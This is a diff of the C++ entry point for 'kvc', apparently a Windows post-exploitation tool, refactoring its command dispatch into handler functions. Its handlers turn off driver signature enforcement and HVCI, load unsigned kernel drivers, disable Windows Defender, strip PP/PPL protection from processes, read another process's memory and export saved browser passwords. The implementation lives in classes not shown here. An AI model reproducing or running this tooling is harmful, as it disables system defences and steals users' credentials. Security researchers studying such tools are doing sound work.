@@ -13,6 +13,11 @@
 #include <signal.h>
 #include <charconv>
 #include <Shlobj.h>
+#include <functional>
+#include <unordered_map>
+#include <string>
+#include <vector>
+#include <sstream>
 
 #pragma comment(lib, "Shell32.lib")
 
@@ -20,1410 +25,712 @@
 // GLOBAL STATE
 // ============================================================================
 
-// Global controller instance for driver and system operations
 std::unique_ptr<Controller> g_controller;
-
-// Signal handler flag for graceful shutdown
 volatile bool g_interrupted = false;
 
 // ============================================================================
-// FORWARD DECLARATIONS
+// HELPERS
 // ============================================================================
 
-void CleanupDriver() noexcept;
-std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept;
-bool IsNumeric(std::wstring_view str) noexcept;
-bool IsHelpFlag(std::wstring_view arg) noexcept;
-bool CheckKvcPassExists() noexcept;
-bool InitiateSystemRestart() noexcept;
+void CleanupDriver() noexcept {
+    if (g_controller) g_controller->PerformAtomicCleanup();
+}
 
-// ============================================================================
-// SIGNAL HANDLERS
-// ============================================================================
-
-// Emergency signal handler for Ctrl+C - ensures proper driver cleanup to prevent system instability
-void SignalHandler(int signum)
-{
+void SignalHandler(int signum) {
     if (signum == SIGINT) {
         g_interrupted = true;
         ERROR(L"\nInterrupted by user - performing emergency cleanup...");
         CleanupDriver();
-        exit(130); // Standard exit code for Ctrl+C
+        exit(130);
     }
 }
 
-// ============================================================================
-// HELPER FUNCTIONS
-// ============================================================================
+// Helper to remove whitespace from both ends of a string
+std::wstring Trim(const std::wstring& str) {
+    size_t first = str.find_first_not_of(L" \t");
+    if (first == std::wstring::npos) return L"";
+    size_t last = str.find_last_not_of(L" \t");
+    return str.substr(first, last - first + 1);
+}
 
-// Robust PID parsing with validation using std::from_chars, rejects non-ASCII characters
-std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept
-{
+std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept {
     if (pidStr.empty()) return std::nullopt;
-
-    // Convert wide string to narrow for std::from_chars compatibility
     std::string narrowStr;
     narrowStr.reserve(pidStr.size());
-    
     for (wchar_t wc : pidStr) {
-        if (wc > 127) return std::nullopt; // Non-ASCII character detected
+        if (wc > 127) return std::nullopt;
         narrowStr.push_back(static_cast<char>(wc));
     }
-
     DWORD result = 0;
-    auto [ptr, ec] = std::from_chars(narrowStr.data(), 
-                                     narrowStr.data() + narrowStr.size(), 
-                                     result);
-    
-    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? 
-           std::make_optional(result) : std::nullopt;
+    auto [ptr, ec] = std::from_chars(narrowStr.data(), narrowStr.data() + narrowStr.size(), result);
+    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? std::make_optional(result) : std::nullopt;
 }
 
-// Checks if string contains only digits
-bool IsNumeric(std::wstring_view str) noexcept
-{
+bool IsNumeric(std::wstring_view str) noexcept {
     if (str.empty()) return false;
-    
-    for (wchar_t ch : str) {
-        if (ch < L'0' || ch > L'9')
-            return false;
-    }
-    
+    for (wchar_t ch : str) if (ch < L'0' || ch > L'9') return false;
     return true;
 }
 
-// Recognizes various help flag formats: /?, /help, /h, -?, -help, -h, --help, --h, help, ?
-bool IsHelpFlag(std::wstring_view arg) noexcept
-{
-    if (arg == L"/?" || arg == L"/help" || arg == L"/h")
-        return true;
-    
-    if (arg == L"-?" || arg == L"-help" || arg == L"-h")
-        return true;
-    
-    if (arg == L"--help" || arg == L"--h")
-        return true;
-    
-    if (arg == L"help" || arg == L"?")
-        return true;
-    
-    return false;
+bool IsHelpFlag(std::wstring_view arg) noexcept {
+    return (arg == L"/?" || arg == L"/help" || arg == L"/h" || 
+            arg == L"-?" || arg == L"-help" || arg == L"-h" || 
+            arg == L"--help" || arg == L"--h" || arg == L"help" || arg == L"?");
 }
 
-// Checks if kvc_pass.exe exists in current directory or System32
-bool CheckKvcPassExists() noexcept
-{
-    // Check current directory
-    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) 
-        return true;
-    
-    // Check System32
+bool CheckKvcPassExists() noexcept {
+    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) return true;
     wchar_t systemDir[MAX_PATH];
     if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
         std::wstring path = std::wstring(systemDir) + L"\\kvc_pass.exe";
         return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
     }
-    
     return false;
 }
 
-// Initiates system restart with SE_SHUTDOWN_NAME privilege for security engine changes
-bool InitiateSystemRestart() noexcept
-{
-    HANDLE token;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
-        ERROR(L"Failed to open process token for restart");
-        return false;
-    }
-
-    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) {
-        ERROR(L"Failed to lookup shutdown privilege");
-        CloseHandle(token);
-        return false;
-    }
-
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
+bool InitiateSystemRestart() noexcept {
+    HANDLE token; TOKEN_PRIVILEGES tp; LUID luid;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
+    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) { CloseHandle(token); return false; }
+    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     bool success = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
     CloseHandle(token);
-
-    if (!success) {
-        ERROR(L"Failed to enable shutdown privilege");
-        return false;
-    }
-
-    // Initiate system restart with appropriate reason code
-    return ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 
-                        SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0;
+    return success ? (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0) : false;
 }
 
-// Emergency cleanup for driver resources - called on exit or Ctrl+C
-void CleanupDriver() noexcept
-{
-    if (g_controller) {
-        g_controller->PerformAtomicCleanup();
+// ============================================================================
+// COMMAND HANDLERS
+// ============================================================================
+
+int HandleDriverCommand(int argc, wchar_t* argv[]) {
+    if (argc < 3) {
+        ERROR(L"Missing driver subcommand");
+        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
+        return 1;
     }
+    std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);
+
+    if (subCmd == L"load") {
+        if (argc < 4) {
+            ERROR(L"Missing driver path");
+            ERROR(L"Usage: kvc driver load <path> [-s <0-4>]");
+            return 1;
+        }
+        DWORD startType = SERVICE_DEMAND_START;
+        if (argc >= 6 && std::wstring(argv[4]) == L"-s") {
+            startType = static_cast<DWORD>(_wtoi(argv[5]));
+        }
+        return g_controller->LoadExternalDriver(argv[3], startType) ? 0 : 2;
+    }
+    
+    if (argc < 4) {
+        ERROR(L"Missing driver name/path");
+        // Uproszczony help dla reszty
+        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
+        return 1;
+    }
+
+    if (subCmd == L"reload") return g_controller->ReloadExternalDriver(argv[3]) ? 0 : 2;
+    if (subCmd == L"stop") return g_controller->StopExternalDriver(argv[3]) ? 0 : 2;
+    if (subCmd == L"remove") return g_controller->RemoveExternalDriver(argv[3]) ? 0 : 2;
+    
+    ERROR(L"Unknown driver subcommand: %s", subCmd.c_str());
+    return 1;
+}
+
+int HandleUninstall(int, wchar_t**) {
+    INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
+    bool success = ServiceManager::UninstallService();
+    
+    INFO(L"Cleaning up registry configuration...");
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        LONG result = RegDeleteTreeW(hKey, L"kvc");
+        if (result == ERROR_SUCCESS) SUCCESS(L"Registry configuration cleaned successfully");
+        else if (result == ERROR_FILE_NOT_FOUND) INFO(L"No registry configuration found to clean");
+        else ERROR(L"Failed to clean registry configuration: %d", result);
+        RegCloseKey(hKey);
+    }
+    return success ? 0 : 1;
+}
+
+int HandleServiceCommand(int argc, wchar_t* argv[]) {
+    if (argc < 3) {
+        ERROR(L"Missing service command: start, stop, restart");
+        return 1;
+    }
+    std::wstring subCmd = argv[2];
+
+    if (subCmd == L"start") {
+        INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
+        return ServiceManager::StartServiceProcess() ? (SUCCESS(L"Service started successfully"), 0) : (ERROR(L"Failed to start service"), 1);
+    }
+    if (subCmd == L"stop") {
+        INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
+        return ServiceManager::StopServiceProcess() ? (SUCCESS(L"Service stopped successfully"), 0) : (ERROR(L"Failed to stop service"), 1);
+    }
+    if (subCmd == L"restart") {
+		INFO(L"Restarting Kernel Vulnerability Capabilities Framework service...");
+		INFO(L"Stopping service...");
+		bool stopped = ServiceManager::StopServiceProcess();
+		INFO(L"Starting service...");
+		bool started = ServiceManager::StartServiceProcess();
+		return (stopped && started) ? 0 : 1;
+    }
+    if (subCmd == L"status") {
+        INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
+        const bool installed = IsServiceInstalled();
+        const bool running = installed ? IsServiceRunning() : false;
+        
+        std::wcout << L"\n";
+        INFO(L"Service Information:");
+        INFO(L" Name: %s", ServiceConstants::SERVICE_NAME);
+        INFO(L" Display Name: %s", ServiceConstants::SERVICE_DISPLAY_NAME);
+        std::wcout << L"\n";
+        
+        if (installed) {
+            SUCCESS(L"Installation Status: INSTALLED");
+            if (running) {
+                SUCCESS(L"Runtime Status: RUNNING");
+                SUCCESS(L"Service is operational and ready for kernel operations");
+            } else {
+                ERROR(L"Runtime Status: STOPPED");
+                INFO(L"Use 'kvc service start' to start the service");
+            }
+        } else {
+            ERROR(L"Installation Status: NOT INSTALLED");
+            INFO(L"Use 'kvc install' to install the service first");
+        }
+        std::wcout << L"\n";
+        return 0;
+    }
+    ERROR(L"Unknown service command: %s", subCmd.c_str());
+    return 1;
+}
+
+int HandleDseCommand(int argc, wchar_t* argv[]) {
+    // 1. STATUS CHECK
+    if (argc < 3) {
+        INFO(L"Checking Driver Signature Enforcement status...");
+        
+        ULONG_PTR ciOptionsAddr = 0;
+        DWORD value = 0;
+        
+        if (!g_controller->GetDSEStatus(ciOptionsAddr, value)) {
+            ERROR(L"Failed to retrieve DSE status");
+            return 2;
+        }
+        
+        bool dseEnabled = (value & 0x6) != 0;
+        bool hvciEnabled = (value & 0x0001C000) == 0x0001C000;
+        
+        std::wcout << L"\n";
+        INFO(L"DSE Status Information:");
+        INFO(L"g_CiOptions address: 0x%llX", ciOptionsAddr);
+        INFO(L"g_CiOptions value: 0x%08X", value);
+        
+        auto dseNGCallback = SessionManager::GetOriginalCiCallback();
+        if (dseNGCallback != 0) {
+            INFO(L"DSE-NG (Safe Mode) active - callback saved: 0x%llX", dseNGCallback);
+        }
+
+        std::wcout << L"\n";
+        
+        if (hvciEnabled) {
+            INFO(L"Recommended: 'kvc dse off --safe' - modern method (requires reboot, preserves VBS)");
+            INFO(L"Legacy: 'kvc dse off' - HVCI bypass (requires reboot, disables Secure Kernel)");
+        }
+        else if (dseEnabled) {
+            SUCCESS(L"DSE can be safely disabled using 'kvc dse off --safe'");
+        } else {
+            INFO(L"Driver signature enforcement: DISABLED");
+            INFO(L"Unsigned drivers allowed");
+            INFO(L"Use 'kvc dse on --safe' to restore kernel protection");
+        }
+        std::wcout << L"\n";
+        return 0;
+    }
+    
+    // 2. ACTIONS
+    std::wstring subCmd = argv[2];
+    bool safe = (argc >= 4 && std::wstring(argv[3]) == L"--safe");
+
+    if (subCmd == L"off") {
+        if (safe) {
+            INFO(L"Executing Next-Gen DSE Bypass (PDB-based)...");
+            return g_controller->DisableDSESafe() ? 0 : 2;
+        }
+        INFO(L"Disabling driver signature enforcement...");
+        return g_controller->DisableDSE() ? 0 : 2;
+    }
+    else if (subCmd == L"on") {
+        if (safe) {
+            INFO(L"Restoring DSE using Next-Gen method...");
+            return g_controller->RestoreDSESafe() ? 0 : 2;
+        }
+        INFO(L"Restoring driver signature enforcement...");
+        return g_controller->RestoreDSE() ? 0 : 2;
+    }
+    else {
+        ERROR(L"Unknown DSE command: %s", subCmd.c_str());
+        ERROR(L"Usage: kvc dse [off|on]  or  kvc dse  (status)");
+        return 1;
+    }
+}
+
+int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
+    if (argc < 3) {
+        ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
+        return 1;
+    }
+    std::wstring_view sub = argv[2];
+    bool restart = (argc > 3 && std::wstring(argv[3]) == L"--restart");
+
+    if (sub == L"disable") {
+        INFO(L"Disabling Windows Defender (requires restart)...");
+        if (DefenderManager::DisableSecurityEngine()) {
+            SUCCESS(L"Security engine disabled successfully - restart required");
+            if (restart) { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
+            return 0;
+        }
+        return 1;
+    }
+    if (sub == L"enable") {
+        INFO(L"Enabling Windows Defender (requires restart)...");
+        if (DefenderManager::EnableSecurityEngine()) {
+            SUCCESS(L"Security engine enabled successfully - restart required");
+            if (restart) { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
+            return 0;
+        }
+        return 1;
+    }
+    if (sub == L"status") {
+        auto status = DefenderManager::GetSecurityEngineStatus();
+        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+        
+        if (status == DefenderManager::SecurityState::ENABLED) {
+            INFO(L"Security Engine Status: ENABLED (Active Protection)");
+            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+            std::wcout << L" Windows Defender is actively protecting the system\n";
+        } else if (status == DefenderManager::SecurityState::DISABLED) {
+            INFO(L"Security Engine Status: DISABLED (Inactive Protection)");
+            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
+            std::wcout << L" Windows Defender protection is disabled\n";
+        } else {
+            INFO(L"Security Engine Status: UNKNOWN (Cannot determine state)");
+            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+            std::wcout << L" Unable to determine Defender protection state\n";
+        }
+        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); // Reset
+        return 0;
+    }
+    
+    ERROR(L"Invalid secengine subcommand: %s", std::wstring(sub).c_str());
+    ERROR(L"Valid subcommands: disable, enable, status");
+    return 1;
+}
+
+int HandleModulesCommand(int argc, wchar_t* argv[]) {
+    if (argc < 3) {
+        ERROR(L"Missing PID/process name argument");
+        ERROR(L"Usage: kvc modules <PID|process_name> [read <module> [offset] [size]]");
+        return 1;
+    }
+    std::wstring_view target = argv[2];
+    DWORD pid = 0;
+
+    if (IsNumeric(target)) {
+        if (auto p = ParsePid(target)) pid = p.value(); else { ERROR(L"Invalid PID format: %s", target.data()); return 1; }
+    } else {
+        auto match = g_controller->ResolveNameWithoutDriver(std::wstring(target));
+        if (!match) { ERROR(L"Process not found: %s", target.data()); return 1; }
+        pid = match->Pid;
+        INFO(L"Resolved '%s' to PID %lu", match->ProcessName.c_str(), pid);
+    }
+
+    if (argc >= 4 && StringUtils::ToLowerCaseCopy(argv[3]) == L"read") {
+        if (argc < 5) {
+            ERROR(L"Missing module name for read operation");
+            ERROR(L"Usage: kvc modules <PID> read <module_name> [offset] [size]");
+            return 1;
+        }
+        std::wstring module = argv[4];
+        ULONG_PTR offset = 0;
+        size_t size = 256;
+        if (argc >= 6) offset = std::wcstoull(argv[5], nullptr, 0); 
+        if (argc >= 7) size = std::wcstoull(argv[6], nullptr, 0);
+        return g_controller->ReadModuleMemory(pid, module, offset, size) ? 0 : 2;
+    }
+    return g_controller->EnumerateProcessModules(pid) ? 0 : 2;
+}
+
+int HandleProtectionCommand(int argc, wchar_t* argv[], bool isSet) {
+    if (argc < 5) {
+        ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
+        return 1;
+    }
+    std::wstring target = argv[2];
+    std::wstring level = argv[3];
+    std::wstring signer = argv[4];
+
+    // Batch processing
+    if (target.find(L',') != std::wstring::npos) {
+        std::vector<std::wstring> targets;
+        std::wstringstream ss(target);
+        std::wstring item;
+        while (std::getline(ss, item, L',')) {
+            std::wstring trimmed = Trim(item);
+            if (!trimmed.empty()) targets.push_back(trimmed);
+        }
+        
+        if (targets.empty()) { ERROR(L"No valid targets in comma-separated list"); return 1; }
+        INFO(L"Batch %s operation: %zu targets", isSet ? L"set" : L"protect", targets.size());
+        
+        return (isSet ? g_controller->SetMultipleProcessesProtection(targets, level, signer) : 
+                        g_controller->ProtectMultipleProcesses(targets, level, signer)) ? 0 : 2;
+    }
+
+    // Single processing
+    if (IsNumeric(target)) {
+        auto pid = ParsePid(target);
+        if (!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
+        return (isSet ? g_controller->SetProcessProtection(pid.value(), level, signer) : 
+                        g_controller->ProtectProcess(pid.value(), level, signer)) ? 0 : 2;
+    } else {
+        return (isSet ? g_controller->SetProcessProtectionByName(target, level, signer) : 
+                        g_controller->ProtectProcessByName(target, level, signer)) ? 0 : 2;
+    }
+}
+
+int HandleUnprotectCommand(int argc, wchar_t* argv[]) {
+    if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
+    std::wstring target = argv[2];
+    
+    if (target == L"all") return g_controller->UnprotectAllProcesses() ? 0 : 2;
+    
+    // Batch
+    if (target.find(L',') != std::wstring::npos) {
+        std::vector<std::wstring> list;
+        std::wstringstream ss(target); 
+        std::wstring s;
+        while (std::getline(ss, s, L',')) {
+            std::wstring trimmed = Trim(s);
+            if (!trimmed.empty()) list.push_back(trimmed);
+        }
+        return g_controller->UnprotectMultipleProcesses(list) ? 0 : 2;
+    }
+    
+    if (Utils::GetSignerTypeFromString(target)) return g_controller->UnprotectBySigner(target) ? 0 : 2;
+    
+    if (IsNumeric(target)) {
+         auto pid = ParsePid(target);
+         if(!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
+         return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
+    }
+    return g_controller->UnprotectProcessByName(target) ? 0 : 2;
+}
+
+int HandleBrowserPasswords(int argc, wchar_t* argv[]) {
+    std::wstring browserType = L"chrome";
+    std::wstring outputPath = L".";
+    
+    for (int i = 2; i < argc; i++) {
+        std::wstring arg = argv[i];
+        if (arg == L"--chrome") browserType = L"chrome";
+        else if (arg == L"--brave") browserType = L"brave";
+        else if (arg == L"--edge") browserType = L"edge";
+        else if (arg == L"--all") browserType = L"all";
+        else if (arg == L"--output" || arg == L"-o") {
+            if (i + 1 < argc) outputPath = argv[++i];
+            else { ERROR(L"Missing path for --output argument"); return 1; }
+        }
+        else { ERROR(L"Unknown argument: %s", arg.c_str()); return 1; }
+    }
+
+    if (browserType == L"all") {
+        if (!CheckKvcPassExists()) { ERROR(L"--all requires kvc_pass.exe"); return 1; }
+        if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to extract from all browsers"); return 1; }
+        return 0;
+    }
+
+    if (browserType == L"edge") {
+        if (CheckKvcPassExists()) {
+            INFO(L"Full Edge extraction: JSON (kvc_pass) + HTML/TXT (KVC DPAPI)");
+            if (!g_controller->ExportBrowserData(outputPath, browserType)) ERROR(L"kvc_pass extraction failed");
+            INFO(L"Generating HTML/TXT reports...");
+            g_controller->ShowPasswords(outputPath);
+            SUCCESS(L"Edge extraction complete");
+        } else {
+            INFO(L"Using built-in Edge DPAPI extraction (HTML/TXT only)");
+            g_controller->ShowPasswords(outputPath);
+        }
+        return 0;
+    }
+
+    if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to export browser passwords"); return 1; }
+    return 0;
 }
 
 // ============================================================================
 // MAIN APPLICATION ENTRY POINT
 // ============================================================================
 
-// Main entry point with comprehensive command handling for service management, process operations, browser extraction, security operations and more
 int wmain(int argc, wchar_t* argv[])
 {
-    // Install signal handler for emergency cleanup on Ctrl+C
     signal(SIGINT, SignalHandler);
     
-    // Service mode detection - MUST BE FIRST to handle NT service startup
-    if (argc >= 2) {
-        std::wstring_view firstArg = argv[1];
-        if (firstArg == L"--service") {
-            return ServiceManager::RunAsService();
-        }
+    if (argc >= 2 && std::wstring_view(argv[1]) == L"--service") {
+        return ServiceManager::RunAsService();
     }
     
-    // Display comprehensive help if no arguments provided
-    if (argc < 2) {
+    if (argc < 2 || IsHelpFlag(argv[1])) {
         HelpSystem::PrintUsage(argv[0]);
-        return 1;
+        return argc < 2 ? 1 : 0;
     }
-
-    std::wstring_view firstArg = argv[1];
-    
-    // Handle various help flag formats
-    if (IsHelpFlag(firstArg)) {
-        HelpSystem::PrintUsage(argv[0]);
-        return 0;
-    }
-
-    // Initialize controller for kernel operations and driver management
-    g_controller = std::make_unique<Controller>();
-    std::wstring_view command = firstArg;
 
     try {
-        // ====================================================================
-        // SERVICE MANAGEMENT COMMANDS
-        // ====================================================================
-        
-        if (command == L"install") {
+        g_controller = std::make_unique<Controller>();
+    } catch (...) {
+        ERROR(L"Failed to initialize Controller");
+        return 3;
+    }
+
+    std::wstring command = argv[1];
+
+    using CommandHandler = std::function<int(int, wchar_t**)>;
+    
+    static const std::unordered_map<std::wstring, CommandHandler> commandMap = {
+        // --- Service ---
+        {L"install", [](int, wchar_t**) {
             wchar_t exePath[MAX_PATH];
-            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
-                ERROR(L"Failed to get current executable path");
-                return 1;
-            }
-            
+            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) { ERROR(L"Failed to get current executable path"); return 1; }
             INFO(L"Installing Kernel Vulnerability Capabilities Framework service...");
-            bool success = ServiceManager::InstallService(exePath);
-            return success ? 0 : 1;
-        }
-        
-        else if (command == L"uninstall") {
-            INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
-            bool success = ServiceManager::UninstallService();
-            
-            // Clear the entire configuration from the registry
-            INFO(L"Cleaning up registry configuration...");
-            HKEY hKey;
-            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-                LONG result = RegDeleteTreeW(hKey, L"kvc");
-                if (result == ERROR_SUCCESS) {
-                    SUCCESS(L"Registry configuration cleaned successfully");
-                } else if (result == ERROR_FILE_NOT_FOUND) {
-                    INFO(L"No registry configuration found to clean");
-                } else {
-                    ERROR(L"Failed to clean registry configuration: %d", result);
-                }
-                RegCloseKey(hKey);
-            }
-            
-            return success ? 0 : 1;
-        }
-		
-		// ============================================================================
-		// DSE (DRIVER SIGNATURE ENFORCEMENT) COMMANDS
-		// ============================================================================
+            return ServiceManager::InstallService(exePath) ? 0 : 1;
+        }},
+        {L"uninstall", HandleUninstall},
+        {L"service", HandleServiceCommand},
 
-		else if (command == L"dse") {
-			// No parameter = check status
-			if (argc < 3) {
-				DEBUG(L"Checking Driver Signature Enforcement status...");
-				
-				ULONG_PTR ciOptionsAddr = 0;
-				DWORD value = 0;
-				
-				if (!g_controller->GetDSEStatus(ciOptionsAddr, value)) {
-					ERROR(L"Failed to retrieve DSE status");
-					return 2;
-				}
-				
-				bool dseEnabled = (value & 0x6) != 0;  // Bit 1 and 2 = DSE
-                bool hvciEnabled = (value & 0x0001C000) == 0x0001C000;  // Memory Integrity ON - requires reboot (TODO: verify for testsigning/debug/hyperlaunch)
-				
-				std::wcout << L"\n";
-				INFO(L"DSE Status Information:");
-				INFO(L"g_CiOptions address: 0x%llX", ciOptionsAddr);
-				INFO(L"g_CiOptions value: 0x%08X", value);
-				auto dseNGCallback = SessionManager::GetOriginalCiCallback();
-				if (dseNGCallback != 0) {
-					INFO(L"DSE-NG (Safe Mode) active - callback saved: 0x%llX", dseNGCallback);
-				}
+        // --- DSE & Driver ---
+        {L"dse", HandleDseCommand},
+        {L"driver", HandleDriverCommand},
 
-				std::wcout << L"\n";
-				
-				// Check for HVCI/VBS first
-				if (hvciEnabled) {
-					INFO(L"Recommended: 'kvc dse off --safe' - modern method (requires reboot, preserves VBS)");
-					INFO(L"Legacy: 'kvc dse off' - HVCI bypass (requires reboot, disables Secure Kernel)");
-				}
-				else if (dseEnabled) {
-					SUCCESS(L"DSE can be safely disabled using 'kvc dse off --safe'");
-				} else {
-					INFO(L"Driver signature enforcement: DISABLED");
-					INFO(L"Unsigned drivers allowed");
-					INFO(L"Use 'kvc dse on --safe' to restore kernel protection");
-				}
-				
-				std::wcout << L"\n";
-				return 0;
-			}
-			
-			std::wstring_view subCmd = argv[2];
-            bool safeMode = false;
-
-            // Check for --safe flag in 3rd argument
-            if (argc >= 4) {
-                std::wstring_view flag = argv[3];
-                if (flag == L"--safe") {
-                    safeMode = true;
-                }
-            }
-			
-			if (subCmd == L"off") {
-                if (safeMode) {
-                    INFO(L"Executing Next-Gen DSE Bypass (PDB-based)...");
-                    if (!g_controller->DisableDSESafe()) {
-                        return 2;
-                    }
-                    return 0;
-                }
-                
-				DEBUG(L"Normal DSE disable request");
-				INFO(L"Disabling driver signature enforcement...");
-				
-				if (!g_controller->DisableDSE()) {
-					ERROR(L"Failed to disable DSE");
-					return 2;
-				}
-				
-			//wesmar-debug: INFO(L"g_CiOptions address: 0x%llX", g_controller->GetCiOptionsAddress());
-				return 0;
-			}
-			else if (subCmd == L"on") {
-                if (safeMode) {
-                    INFO(L"Restoring DSE using Next-Gen method...");
-                    if (!g_controller->RestoreDSESafe()) {
-                        return 2;
-                    }
-                    return 0;
-                }
-
-				INFO(L"Restoring driver signature enforcement...");
-				
-				if (!g_controller->RestoreDSE()) {
-					ERROR(L"Failed to restore DSE");
-					return 2;
-				}
-			return 0;
-			}
-			else {
-				ERROR(L"Unknown DSE command: %s", subCmd.data());
-				ERROR(L"Usage: kvc dse [off|on]  or  kvc dse  (status)");
-				return 1;
-			}
-		}
-		
-		// ============================================================================
-		// EXTERNAL DRIVER LOADING COMMANDS
-		// ============================================================================
-		
-		else if (command == L"driver") {
-			if (argc < 3) {
-				ERROR(L"Missing driver subcommand");
-				ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
-				return 1;
-			}
-			
-			std::wstring subCmd = StringUtils::ToLowerCaseCopy(std::wstring(argv[2]));
-			
-			if (subCmd == L"load") {
-				if (argc < 4) {
-					ERROR(L"Missing driver path");
-					ERROR(L"Usage: kvc driver load <path> [-s <0-4>]");
-					return 1;
-				}
-				
-				std::wstring driverPath = argv[3];
-				DWORD startType = SERVICE_DEMAND_START;  // Default: 3 (DEMAND)
-				
-				// Check for optional -s flag
-				if (argc >= 6) {
-					std::wstring flag = StringUtils::ToLowerCaseCopy(std::wstring(argv[4]));
-					if (flag == L"-s") {
-						int type = _wtoi(argv[5]);
-						if (type >= 0 && type <= 4) {
-							startType = static_cast<DWORD>(type);
-						}
-					}
-				}
-				
-				return g_controller->LoadExternalDriver(driverPath, startType) ? 0 : 2;
-			}
-			else if (subCmd == L"reload") {
-				if (argc < 4) {
-					ERROR(L"Missing driver name/path");
-					ERROR(L"Usage: kvc driver reload <name|path>");
-					return 1;
-				}
-				
-				return g_controller->ReloadExternalDriver(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"stop") {
-				if (argc < 4) {
-					ERROR(L"Missing driver name");
-					ERROR(L"Usage: kvc driver stop <name>");
-					return 1;
-				}
-				
-				return g_controller->StopExternalDriver(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"remove") {
-				if (argc < 4) {
-					ERROR(L"Missing driver name");
-					ERROR(L"Usage: kvc driver remove <name>");
-					return 1;
-				}
-				
-				return g_controller->RemoveExternalDriver(argv[3]) ? 0 : 2;
-			}
-			else {
-				ERROR(L"Unknown driver subcommand: %s", subCmd.c_str());
-				ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
-				return 1;
-			}
-		}
-		
-		else if (command == L"service") {
-            if (argc < 3) {
-                ERROR(L"Missing service command: start, stop, restart");
-                return 1;
-            }
-            
-            std::wstring_view subCmd = argv[2];
-            
-			if (subCmd == L"start") {
-				INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
-				bool result = ServiceManager::StartServiceProcess();
-				if (result) {
-					SUCCESS(L"Service started successfully");
-				} else {
-					ERROR(L"Failed to start service");
-				}
-				return result ? 0 : 1;
-			} else if (subCmd == L"stop") {
-				INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
-				bool result = ServiceManager::StopServiceProcess();
-				if (result) {
-					SUCCESS(L"Service stopped successfully");
-				} else {
-					ERROR(L"Failed to stop service");
-				}
-				return result ? 0 : 1;
-			} else if (subCmd == L"restart") {
-				INFO(L"Restarting Kernel Vulnerability Capabilities Framework service...");
-				
-				INFO(L"Stopping service...");
-				bool stopped = ServiceManager::StopServiceProcess();
-				if (stopped) {
-					SUCCESS(L"Service stopped");
-				} else {
-					ERROR(L"Failed to stop service");
-				}
-				
-				// Only for service debug Sleep(500);
-				
-				INFO(L"Starting service...");
-				bool started = ServiceManager::StartServiceProcess();
-				if (started) {
-					SUCCESS(L"Service started");
-				} else {
-					ERROR(L"Failed to start service");
-				}
-				
-				return (stopped && started) ? 0 : 1;
-			} else if (subCmd == L"status") {
-				INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
-				
